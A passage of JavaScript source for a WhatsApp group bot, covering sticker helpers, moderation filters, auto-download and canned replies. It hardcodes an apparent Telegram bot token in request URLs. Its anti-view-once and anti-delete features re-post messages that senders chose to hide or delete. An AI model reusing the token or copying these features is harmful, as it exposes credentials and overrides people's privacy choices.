async function addExifAvatar(buffer, packname, author, categories = [''], extra = {}) {
  const {
      default: {
            Image
                }
                  } = await import('node-webpmux')
                    const img = new Image()
                      const json = {
                          'sticker-pack-id': 'Natsxe',
                              'sticker-pack-name': packname,
                                  'sticker-pack-publisher': author,
                                      'emojis': categories,
                                          'is-avatar-sticker': 1,
                                              ...extra
                                                }
                                                  let exifAttr = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00, 0x00, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00])
                                                    let jsonBuffer = Buffer.from(JSON.stringify(json), 'utf8')
                                                      let exif = Buffer.concat([exifAttr, jsonBuffer])
                                                        exif.writeUIntLE(jsonBuffer.length, 14, 4)
                                                          await img.load(buffer)
                                                            img.exif = exif
                                                              return await img.save(null)
                                                              }
function makeid(length) {
  let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
      const charactersLength = characters.length;
  for (let i = 0; i < length; i++) {
      result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
  return result;
  }

function rumus(tMatch, tWr, wrReq) {
    let tWin = tMatch * (tWr / 100);
    let tLose = tMatch - tWin;
    let sisaWr = 100 - wrReq;
    let wrResult = 100 / sisaWr;
    let seratusPersen = tLose * wrResult;
    let final = seratusPersen - tMatch;
    return Math.round(final);
}

function rumusLose(tMatch, tWr, wrReq) {
    let persen = tWr - wrReq;
    let final = tMatch * (persen / 100);
    return Math.round(final);
}

function capitalizeFirstLetter(str) {
	let words = str.split(" ")
	for (let i = 0; i < words.length; i++) {
		words[i] = words[i].charAt(0).toUpperCase() + words[i].slice(1).toLowerCase()
	}

	return words.join(" ")
}      

  function toRupiah(angka) {
var saldo = '';
var angkarev = angka.toString().split('').reverse().join('');
for (var i = 0; i < angkarev.length; i++)
if (i % 3 == 0) saldo += angkarev.substr(i, 3) + '.';
return '' + saldo.split('', saldo.length - 1).reverse().join('');
}

async function styletext(teks) {
    return new Promise((resolve, reject) => {
        axios.get('http://qaz.wtf/u/convert.cgi?text='+teks)
        .then(({ data }) => {
            let $ = cheerio.load(data)
            let hasil = []
            $('table > tbody > tr').each(function (a, b) {
                hasil.push({ name: $(b).find('td:nth-child(1) > span').text(), result: $(b).find('td:nth-child(2)').text().trim() })
            })
            resolve(hasil)
        })
    })
}

async function dellCase(filePath, caseNameToRemove) {
    fs.readFile(filePath, 'utf8', (err, data) => {
        if (err) {
            console.error('An error occurred:', err);
            return;
        }

        const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
        const modifiedData = data.replace(regex, '');

        fs.writeFile(filePath, modifiedData, 'utf8', (err) => {
            if (err) {
                console.error('An error occurred while writing to the file:', err);
                return;
            }

            console.log(`Text from case '${caseNameToRemove}' has been removed from the file.`);
        });
    });
}
        
        async function Telesticker(url) {
    return new Promise(async (resolve, reject) => {
        if (!url.match(/(https:\/\/t.me\/addstickers\/)/gi)) return newReply('Enther your url telegram sticker link')
        packName = url.replace("https://t.me/addstickers/", "")
        data = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getStickerSet?name=${encodeURIComponent(packName)}`, {method: "GET",headers: {"User-Agent": "GoogleBot"}})
        const Lorenzoyresult = []
        for (let i = 0; i < data.data.result.stickers.length; i++) {
            fileId = data.data.result.stickers[i].thumb.file_id
            data2 = await axios(`https://api.telegram.org/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/getFile?file_id=${fileId}`)
            result = {
            status: 200,
            author: 'Queen Rias',
            url: "https://api.telegram.org/file/bot891038791:AAHWB1dQd-vi0IbH2NjKYUk-hqQ8rQuzPD4/" + data2.data.result.file_path
            }
            Lorenzoyresult.push(result)
        }
    resolve(Lorenzoyresult)
    })
}
//mega download
function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';

    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));

    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

//trace anime
function formatDuration(ms) {
  let seconds = Math.floor((ms / 1000) % 60);
  let minutes = Math.floor((ms / (1000 * 60)) % 60);
  let hours = Math.floor((ms / (1000 * 60 * 60)) % 24);
  return `${hours.toString().padStart(2, "0")}:${minutes.toString().padStart(2, "0")}:${seconds.toString().padStart(2, "0")}`;
}
        
        //limit func
        async function useLimit(senuseLimitder, amount) {
            db.data.users[sender].limit -= amount
            db.data.users[sender].totalLimit += amount
            newReply(`You have used up: ${amount} limit\nRemaining: ${db.data.users[sender].limit} limit`)
        }
        async function resetLimit() {
            let users = Object.keys(global.db.data.users)
            let LimitLorenzo = isPremium ? limit.prem : limit.free
            for (let i of users) {
               db.data.users[i].limit = LimitLorenzo
            }
            ToxxicTechInc.sendText('120363336528578108@g.us', { text: `Reset Limit`})
        }
        // Grup Only
        if (!m.isGroup && !isCreator && db.data.settings[botNumber].onlygrub ) {
        	if (isCommand){
            return newReply(`Hello buddy! Because We Want to Reduce Spam, Please Use Bot in the Group Chat !\n\nIf you have issue please chat owner wa.me/${ownernumber}`)
            }
        }
        // Private Only
        if (!isCreator && db.data.settings[botNumber].onlypc && m.isGroup) {
        	if (isCommand){
	         return newReply("Hello buddy! if you want to use this bot, please chat the bot in private chat")
	     }
	}
	     
        if (!ToxxicTechInc.public) {
            if (isCreator && !m.key.fromMe) return
        }
        if (db.data.settings[botNumber].online) {
        	if (isCommand) {
        	ToxxicTechInc.sendPresenceUpdate('unavailable', from)
        }
        }
        if (db.data.settings[botNumber].autoread) {
            ToxxicTechInc.readMessages([m.key])
        }
        //auto set bio\\
	if (db.data.settings[botNumber].autobio) {
            ToxxicTechInc.updateProfileStatus(`𝐐𝐮𝐞𝐞𝐧 𝐫𝐢𝐚𝐬 𝐕𝟐 : ${runtime(process.uptime())}`).catch(_ => _)
        }
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let Lorenzomix = ['composing', 'recording']
            Lorenzomix2 = Lorenzomix[Math.floor(Lorenzomix.length * Math.random())]
            ToxxicTechInc.sendPresenceUpdate(Lorenzomix2, from)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let Lorenzomix = ['recording']
            Lorenzomix2 = Lorenzomix[Math.floor(Lorenzomix.length * Math.random())]
            ToxxicTechInc.sendPresenceUpdate(Lorenzomix2, from)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let Lorenzopos = ['composing']
            ToxxicTechInc.sendPresenceUpdate(Lorenzopos, from)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return ToxxicTechInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return ToxxicTechInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return ToxxicTechInc.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (isCreator || isAdmins || !isBotAdmins) return
            ToxxicTechInc.sendMessage(m.chat, { text: `Sorry buddy! you will be removed because the group admin/owner has enabled anti foreign number, only +${antiforeignnumber} country code is allowed to join the group` }, {quoted: m})
            await sleep(2000)
            await ToxxicTechInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of owner) {
list.push({
	    	displayName: await ToxxicTechInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await ToxxicTechInc.getName(i)}\nFN:${await ToxxicTechInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
        //console log
 if (m.message) {
      console.log(
        chalk.black(chalk.bgWhite("[ MESSAGE RECEIVED ]")),
        chalk.black(chalk.bgGreen(new Date())),
        chalk.black(chalk.bgBlue(budy || m.mtype)) +
        "\n" +
        chalk.magenta("=> 💧From"),
        chalk.green(pushname),
        chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> 🌐In"),
        chalk.green(m.isGroup ? pushname : "🧩Private Chat", m.chat)
      )
      global.db.data.settings[botNumber].totalhit += 1
    }
        //antiviewonce
    if ( db.data.chats[m.chat].antiviewonce && m.mtype == 'viewOnceMessageV2') {
        let val = { ...m }
        let msg = val.message?.viewOnceMessage?.message || val.message?.viewOnceMessageV2?.message
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await ToxxicTechInc.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
   if (m.type == 'protocolMessage' && db.data.chats[m.chat].antidelete) {
				const mess = chatUpdate.messages[0].message.protocolMessage
				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*Anti Delete❗*'}, ...chats.key }
					await ToxxicTechInc.relayMessage(m.chat, { [chats.type]: chats.msg }, {})
				}
			}
    //antispam kick
if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && Toxxic_antispam.isFiltered(from)) {
console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await ToxxicTechInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
    
    // Anti promotion
if (db.data.chats[m.chat].antipromotion) {
if (budy.match(`instagram booster|tiktok booster|ml booster|bgmi selling|selling uc|selling diamonds|selling coin|selling id|selling account|selling ids|buy account|sell account|buy id|sell id|instagram followers|tiktok followers|buy panel|sell panel|sell bug bot|buy bug bot|buy bot bug|sell bot bug|adminpanel|bug script|sell script|admin panel 10k pm|Hanya menyediakan Jasa Push Member Grup|admin panel 5k pm|yang mau beli panel murah pm|list PRICE panel by|list PRICE vps|LIST PRICE VPS|OPEN JASA PUSH MEMBER GRUP|READY|Redy|LIST PRICE PANEL BY|list PRICE panel|menyediakan|MENYEDIAKAN|OPEN MURBUG|open|OPEN|PANEL READY|PANEL|PANNEL READY|panel|panel ready|pannel ready minat pm|mau panel pm|MAU PANNEL PM|Admin panel ready|ADMIN PANEL READY|Chat aja om ready selalu|to buy|open jasa installMENYEDIAKAN JASA INSTALL|for sale`)) {
if (!isBotAdmins) return
if(isCreator) return
if (isAdmins) return
ToxxicTechInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
ToxxicTechInc.sendMessage(from, {text:`\`\`\`「 Promotion Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a promotion message and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
}
}

        //ANTI VIRUS
if (isGroup && db.data.chats[m.chat].antivirtex) {
if (budy.length > 500) {
if (isGroupAdmins) return newReply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
ToxxicTechInc.sendText(m.chat, `*MARK AS READ*\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n *Virus sender here👇:* \nwa.me/${sender.split("@")[0]}`)   
if (!isBotAdmins) return
if(isCreator) return
ToxxicTechInc.groupParticipantsUpdate(from, [sender], 'remove')
await ToxxicTechInc.sendMessage(from, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
ToxxicTechInc.sendMessage(`${ownernumber}@s.whatsapp.net`,{text: `Hi Owner! wa.me/${sender.split("@")[0]} Detected Having Sent Virus ${isGroup?`in ${groupName}`:''}`})
 }
 }
  
 if (db.data.chats[m.chat].antibot) {
    if (m.isBaileys && m.fromMe == false){
        if (isAdmins || !isBotAdmins){		  
        } else {
          newReply(`*Another Bot Detected*\n\nHusshhh Get away from this group!!!`)
    return await ToxxicTechInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
    }
   }
 
        //anti media
        if (db.data.chats[m.chat].antimedia && isMedia) {
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Media Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-media for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
  }
        if (db.data.chats[m.chat].image && isToxxicMedia) {
    if(isToxxicMedia === "imageMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Image Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-image for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antivideo && isToxxicMedia) {
    if(isToxxicMedia === "videoMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Video Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-video for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antisticker && isToxxicMedia) {
    if(isToxxicMedia === "stickerMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Sticker Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-sticker for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        if (db.data.chats[m.chat].antiaudio && isToxxicMedia) {
    if(isToxxicMedia === "audioMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Audio Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-audio for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antipoll && isToxxicMedia) {
    if(isToxxicMedia === "pollCreationMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Poll Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-poll for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
       if (db.data.chats[m.chat].antilocation && isToxxicMedia) {
    if(isToxxicMedia === "locationMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Location Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-location for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
  if (m.message && isToxxicMedia) {
    if (isToxxicMedia === "liveLocationMessage") {
        if (isCreator) {		  
        } else {
            newReply(`\`\`\`「 Bug Detected 」\`\`\`\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n`)
            await ToxxicTechInc.chatModify({ delete: true, lastMessages: [{ key: m.key, messageTimestamp: m.messageTimestamp }] }, m.chat); 
            newReply(`「 BLOCKING 」`);
            return ToxxicTechInc.updateBlockStatus(m.sender, 'block');
        }
    }
}
       if (db.data.chats[m.chat].antidocument && isToxxicMedia) {
    if(isToxxicMedia === "documentMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Document Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-document for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
      if (db.data.chats[m.chat].anticontact && isToxxicMedia) {
    if(isToxxicMedia === "contactMessage"){
        if (isCreator || isAdmins || !isBotAdmins){		  
        } else {
          newReply(`\`\`\`「 Contact Detected 」\`\`\`\n\nSorry, but I have to delete it, because the admin/owner has activated anti-contact for this group`)
    return ToxxicTechInc.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.key.id, participant: m.key.participant }})
        }
    }
  }
        //respond
        if (db.data.chats[m.chat].badword) {
            for (let bak of bad) {
               if (budy === bak) {
                  let baduser = await db.data.users[sender].badword
                  ToxxicTechInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ToxxicTechInc.sendMessage(from, {text:`\`\`\`「 Bad Word Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} was using harsh words and his chat has been deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
               }
            }
        }
        //auto download #ctto
        if (db.data.settings[botNumber].autodownload && !m.key.fromMe && !isCmd2) {
try {
if (budy.match(`instagram.com`)) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.abrotech.com.ng/api/igdl?url=${budy}&apikey=abrotech`)
ToxxicTechInc.sendMessage(m.chat, { video: { url: anu.result.media}, caption: `Auto Download ✅`}, {quoted: m})
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`tiktok.com`)) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.abrotech.com.ng/api/tiktokdl?url=${budy}&apikey=abrotech`)
ToxxicTechInc.sendMessage(m.chat, { video: { url: anu.result.Medium.url}, caption: `Auto Download ✅`}, {quoted: m})
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`facebook.com`)) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.abrotech.com.ng/api/fbdl?url=${budy}&apikey=abrotech`)
ToxxicTechInc.sendMessage(m.chat, { video: { url: anu.result.video_sd}, caption: `Auto Download ✅`}, {quoted: m})
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} else if (budy.match(`youtube.com|youtu.be`)) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})   
let anu = await fetchJson(`https://api.abrotech.com.ng/api/ytmp4?q=${budy}&apikey=abrocodes`)
ToxxicTechInc.sendMessage(m.chat, { video: { url: anu.result.result}, caption: ``}, {quoted: m})
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})   
} 
} catch (err) {
await ToxxicTechInc.sendMessage(m.chat, { react: { text: "✖️",key: m.key,}})   
}
} 
        
        //autosticker
        if (db.data.settings[botNumber].autosticker) {
        	if (m.key.fromMe) return
            if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                ToxxicTechInc.sendImageAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
                console.log(`Auto sticker detected`)
            } else if (/video/.test(mime)) {
                if ((quoted.msg || quoted).seconds > 11) return
                let mediac = await quoted.download()
                ToxxicTechInc.sendVideoAsSticker(from, mediac, m, { packname: global.packname, author: global.author })
            }
        }
        
        if (db.data.chats[m.chat].antilinkgc) {
            if (budy.match(`chat.whatsapp.com`)) {
               bvl = `\`\`\`「 GC Link Detected 」\`\`\`\n\nAdmin has sent a gc link, admin is free to send any link😇`
if (isAdmins) return newReply(bvl)
if (m.key.fromMe) return newReply(bvl)
if (isCreator) return newReply(bvl)
               await ToxxicTechInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ToxxicTechInc.sendMessage(from, {text:`\`\`\`「 GC Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        if (db.data.chats[m.chat].antilink) {
            if (budy.match('http') && budy.match('https')) {
               bvl = `\`\`\`「 Link Detected 」\`\`\`\n\nAdmin has sent a link, admin is free to send any link😇`
if (isAdmins) return newReply(bvl)
if (m.key.fromMe) return newReply(bvl)
if (isCreator) return newReply(bvl)
               await ToxxicTechInc.sendMessage(m.chat,
			    {
			        delete: {
			            remoteJid: m.chat,
			            fromMe: false,
			            id: m.key.id,
			            participant: m.key.participant
			        }
			    })
			ToxxicTechInc.sendMessage(from, {text:`\`\`\`「 Link Detected 」\`\`\`\n\n@${m.sender.split("@")[0]} has sent a link and successfully deleted`, contextInfo:{mentionedJid:[m.sender]}}, {quoted:m})
            }
        }
        //afk
        let mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
	     for (let jid of mentionUser) {
            let user = db.data.users[jid]
            if (!user) continue
            let afkTime = user.afkTime
            if (!afkTime || afkTime < 0) continue
            let reason = user.afkReason || ''
            newReply(`Please Don't Tag Him\nHe's AFK ${reason ? 'With reason ' + reason : 'no reason'}\nAfk Since ${clockString(new Date - afkTime)}`.trim())
        }
        if (db.data.users[m.sender].afkTime > -1) {
            let user = global.db.data.users[m.sender]
            newReply(`You Have Returned From AFK\nAFK Reason: ${user.afkReason ? user.afkReason : ''}\nAFK Duration: ${clockString(new Date - user.afkTime)}`.trim())
            user.afkTime = -1
            user.afkReason = ''
        }
        
//total features
const Toxxicfeature = () =>{
            var mytext = fs.readFileSync("./queenrias.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        
        //autoreply
for (let BhosdikaLorenzo of VoiceNoteLorenzo) {
if (budy === BhosdikaLorenzo) {
let audiobuffy = fs.readFileSync(`./File/audio/${BhosdikaLorenzo}.mp3`)
ToxxicTechInc.sendMessage(m.chat, { audio: audiobuffy, mimetype: 'audio/mp4', ptt: true }, { quoted: m })     
}
}
for (let BhosdikaLorenzo of StickerLorenzo){
if (budy === BhosdikaLorenzo){
let stickerbuffy = fs.readFileSync(`./File/sticker/${BhosdikaLorenzo}.webp`)
ToxxicTechInc.sendMessage(m.chat, { sticker: stickerbuffy }, { quoted: m })
}
}
for (let BhosdikaLorenzo of ImageLorenzo){
if (budy === BhosdikaLorenzo){
let imagebuffy = fs.readFileSync(`./File/image/${BhosdikaLorenzo}.jpg`)
ToxxicTechInc.sendMessage(m.chat, { image: imagebuffy }, { quoted: m })
}
}
for (let BhosdikaLorenzo of VideoLorenzo){
if (budy === BhosdikaLorenzo){
let videobuffy = fs.readFileSync(`./File/video/${BhosdikaLorenzo}.mp4`)
ToxxicTechInc.sendMessage(m.chat, { video: videobuffy }, { quoted: m })
}
}

const sendapk = (teks) => {
ToxxicTechInc.sendMessage(from, { document: teks, mimetype: 'application/vnd.android.package-archive'}, {quoted:m})
}
for (let BhosdikaLorenzo of ApkLorenzo) {
if (budy === BhosdikaLorenzo) {
let buffer = fs.readFileSync(`./File/apk/${BhosdikaLorenzo}.apk`)
sendapk(buffer)
}
}

const sendzip = (teks) => {
ToxxicTechInc.sendMessage(from, { document: teks, mimetype: 'application/zip'}, {quoted:m})
}
for (let BhosdikaLorenzo of ZipLorenzo) {
if (budy === BhosdikaLorenzo) {
let buffer = fs.readFileSync(`./File/zip/${BhosdikaLorenzo}.zip`)
sendzip(buffer)
}
}

const senddocu = (teks) => {
ToxxicTechInc.sendMessage(from, { document: teks, mimetype: 'application/pdf'}, {quoted:m})
}
for (let BhosdikaLorenzo of DocLorenzo) {
if (budy === BhosdikaLorenzo) {
let buffer = fs.readFileSync(`./File/doc/${BhosdikaLorenzo}.pdf`)
senddocu(buffer)
}
}

// Response Addlist
if (m.isGroup && isAlreadyResponList(from, body.toLowerCase(), db_respon_list)) {
var get_data_respon = getDataResponList(from, body.toLowerCase(), db_respon_list)
if (get_data_respon.isImage === false) {
ToxxicTechInc.sendMessage(from, { text: sendResponList(from, body.toLowerCase(), db_respon_list) }, {
quoted: m
})
} else {
ToxxicTechInc.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
quoted: m
})
} 
}

// Respon Cmd with media
if (isMedia && m.msg.fileSha256 && (m.msg.fileSha256.toString('base64') in global.db.data.sticker)) {
let hash = global.db.data.sticker[m.msg.fileSha256.toString('base64')]
let { text, mentionedJid } = hash
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
    userJid: ToxxicTechInc.user.id,
    quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, ToxxicTechInc.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
    ...chatUpdate,
    messages: [proto.WebMessageInfo.fromObject(messages)],
    type: 'append'
}
ToxxicTechInc.ev.emit('messages.upsert', msg)
} 
 //Auto reply below
   const responses = {
   
  hello: `Hello ${pushname}, I am *Rias Gremory*.My current prefix is [ ${xprefix} ]. How can I help you?`,
  toxxic: `That's my creator name 😊.`,
  daniel: `That's my Creator name ,Thank you for using a bot from him 🤗 ...`,
  rias: `I am busy, I will reply you when I feel like (¬_¬)ﾉ...`,
  konnichiwa: `Konnichiwa ${pushname}, Watashi wa ${botname}. Genki Desu ka?`,
  'good morning': `Good morning to you too ${pushname} ☺️. Have a great day 😇`,
  bot: `Hey ${pushname},
  ┏━━⟪ *Revolutionize Your WhatsApp Experience with Cutting-Edge Bots!* 🚀⟫━⦿
✨ **Unlock Exclusive Features:**
┃✗ 📖 Seamless Message Reading
┃✗ 📸 Automatic Status Viewing
┃✗ 🤖 AI-Powered Chat Capabilities
┃✗ ☎️ Swift Call Rejection
┃✗ 🌐 24/7 Online Presence
┃✗ 🚫 Auto-block Unwanted DMs 
┃✗ 📥 Effortless Media Downloads
┃✗ 🎶 Instant Song Lyrics Dive
┃✗ ✏️ Text to Image Editors
┃✗ 🏷️ Effortless Member Tagging
┃✗ 🕰️ Timeless View-once Pics
┃✗ 🎮 designing of game fonts or name
┃✗ 📅 Message Scheduler
┃✗ 📲 Offline Message Scheduler
📞 For inquiries, Toxxic Boy at +2348165846414
Transform your WhatsApp world now!🌟. We are trustworthy 👍
┗━━━━━━━━━━━━━━━━━⦿`,
  ohayo: `Ohayo ${pushname} senpai☺️. Genki Desu Ka 😇.`,
  'good afternoon': `Good afternoon to you too ${pushname} ✨. Wishing you an enjoyable afternoon too 😇🤞🏻.`,
  'good night': `Good night to you too ${pushname} 😇. Sleep well and sweet dreams.`,
  'good evening': `Good evening to you too ${pushname} ☺️❤️.`,
  'who': `Let's ask your Father🫳🎤`,
   'baka': `Me and you father 💀`
};
const smallinput = budy.toLowerCase();

    if (responses.hasOwnProperty(smallinput)) {
      newReply(responses[smallinput]);
    }
//============= [LIST RESPONCE CHECKING START ]================
        if(m.mtype === "interactiveResponseMessage"){
            console.log("interactiveResponseMessage Detected!")   
            let msg = m.message[m.mtype]  || m.msg
            if(msg.nativeFlowResponseMessage  && !m.isBot  ){ 
                let { id } = JSON.parse(msg.nativeFlowResponseMessage.paramsJson) || {}  
                if(id){
                    let emit_msg = { 
                        key : { ...m.key } , // SET RANDOME MESSAGE ID  
                        message:{ extendedTextMessage : { text : id } } ,
                        pushName : m.pushName,
                        messageTimestamp  : m.messageTimestamp || 754785898978
                    }
                    return ToxxicTechInc.ev.emit("messages.upsert" , { messages : [ emit_msg ] ,  type : "notify"})
                }
            }
        }
//============= [LIST RESPONCE CHECKING END ]================


//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {
	if (m.key.fromMe) return
            kuis = true
            jawaban = kuismath[m.sender.split('@')[0]]
            if (budy.toLowerCase() == jawaban) {
                await newReply(`🎮 Math Quiz 🎮\n\nCorrect Answer 🎉\n\nWant To Play Again? Send ${prefix}math mode`)
